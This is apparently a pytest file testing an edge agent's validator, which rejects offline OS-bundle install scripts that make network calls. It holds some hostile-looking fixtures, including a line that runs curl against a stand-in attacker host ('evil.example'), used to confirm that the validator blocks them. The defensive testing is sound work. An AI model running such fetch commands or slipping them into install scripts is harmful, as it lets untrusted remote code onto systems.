"""_validate_os_bundle_staged_scripts() — edge/agent.py's pre-install check
on a staged OS bundle's scripts, and the exact regression that failed a real
production Edge 2 update on 2026-09-09.

This is the edge-side mirror of headend/main.py's
_validate_os_bundle_file_policy() (fixed 2026-09-08, PR #189/#199-adjacent).
The edge copy was never updated to match: it still blanket-forbade any line
containing "apt-get" without "--no-download", so the local-repo-index
"apt-get -o Dir::Etc::sourcelist=... update" line install_script() legitimately
emits (headend/tools/fetch_os_bundle.py) got rejected on every real bundle,
failing update #284 (Edge 2, os_security, 216 packages) live.
"""
import importlib.util
import sys
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
REAL_FAILED_SCRIPT = Path("/tmp/real-failed-install-offline.sh")


def _load_agent_module():
    spec = importlib.util.spec_from_file_location("edge_agent_under_test", ROOT / "edge" / "agent.py")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


AGENT = _load_agent_module()


def test_accepts_the_exact_real_bundle_that_failed_update_284(tmp_path):
    # This is a literal copy of the install-offline.sh that update #284
    # (Edge 2, os_security, 216 packages) actually built and then rejected
    # against itself on 2026-09-09, before this fix.
    if not REAL_FAILED_SCRIPT.exists():
        pytest.skip("real failed-bundle fixture not available in this environment")
    (tmp_path / "install-offline.sh").write_text(REAL_FAILED_SCRIPT.read_text())
    AGENT._validate_os_bundle_staged_scripts(tmp_path)  # must not raise


def test_accepts_synthetic_scoped_local_update_with_curl_and_wget_as_package_names(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        "#!/bin/bash\n"
        "set -euo pipefail\n"
        "install -d -m 0755 /var/cache/apt/archives\n"
        "cp -f packages/*.deb /var/cache/apt/archives/\n"
        'local_sourcelist="$(mktemp)"\n'
        'apt-get -o Dir::Etc::sourcelist="$local_sourcelist" -o Dir::Etc::sourceparts="-" \\\n'
        "  -o APT::Get::List-Cleanup=\"0\" update\n"
        "apt-get --no-download --no-install-recommends -y install \\\n"
        "  'curl=7.81.0-1ubuntu1.27' 'wget=1.21.2-2ubuntu1.5'\n"
    )
    AGENT._validate_os_bundle_staged_scripts(tmp_path)


def test_rejects_apt_update_not_scoped_to_a_local_source(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\napt-get update\n")
    with pytest.raises(RuntimeError, match="apt update must be scoped"):
        AGENT._validate_os_bundle_staged_scripts(tmp_path)


def test_rejects_scoped_update_pointing_at_the_real_sources_list(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        '#!/bin/bash\napt-get -o Dir::Etc::sourcelist="/etc/apt/sources.list" update\n'
    )
    with pytest.raises(RuntimeError, match="apt update must be scoped"):
        AGENT._validate_os_bundle_staged_scripts(tmp_path)


def test_rejects_apt_get_install_missing_no_download(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        "#!/bin/bash\napt-get install 'curl=7.81.0-1ubuntu1.27'\n"
    )
    with pytest.raises(RuntimeError, match="without --no-download"):
        AGENT._validate_os_bundle_staged_scripts(tmp_path)


def test_rejects_real_curl_invocation(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\ncurl https://evil.example/x\n")
    with pytest.raises(RuntimeError, match="forbidden online command"):
        AGENT._validate_os_bundle_staged_scripts(tmp_path)


def test_rejects_literal_http_url_anywhere(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        "#!/bin/bash\necho 'see http://example.com for details'\n"
    )
    with pytest.raises(RuntimeError, match="forbidden online command"):
        AGENT._validate_os_bundle_staged_scripts(tmp_path)


def test_rejects_dist_upgrade(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\napt-get dist-upgrade\n")
    with pytest.raises(RuntimeError, match="forbidden online command"):
        AGENT._validate_os_bundle_staged_scripts(tmp_path)


def test_collapses_backslash_continuations_before_scanning(tmp_path):
    # A forbidden command split across a backslash line-continuation must
    # still be caught by a per-logical-line scan.
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\napt-get \\\n  update\n")
    with pytest.raises(RuntimeError, match="apt update must be scoped"):
        AGENT._validate_os_bundle_staged_scripts(tmp_path)


def test_ignores_non_script_files(tmp_path):
    (tmp_path / "packages").mkdir()
    (tmp_path / "packages" / "curl_7.81.0.deb").write_bytes(b"fake deb bytes mentioning curl")
    AGENT._validate_os_bundle_staged_scripts(tmp_path)  # must not raise


def test_ignores_package_manifest_json_mirror_url(tmp_path):
    # Regression for update #290 (2026-09-09): package-manifest.json's
    # "mirror" field is a plain https:// URL string describing where
    # packages were fetched from, not a command — but the unanchored
    # https?:// pattern matched it anywhere in the file, failing every real
    # OS-security bundle before it ever reached the actual apt install step.
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\napt-get --no-download install 'curl=7.81.0-1ubuntu1.27'\n")
    (tmp_path / "package-manifest.json").write_text(
        '{\n  "mirror": "https://ports.ubuntu.com/ubuntu-ports",\n  "suite": "jammy"\n}\n'
    )
    AGENT._validate_os_bundle_staged_scripts(tmp_path)  # must not raise
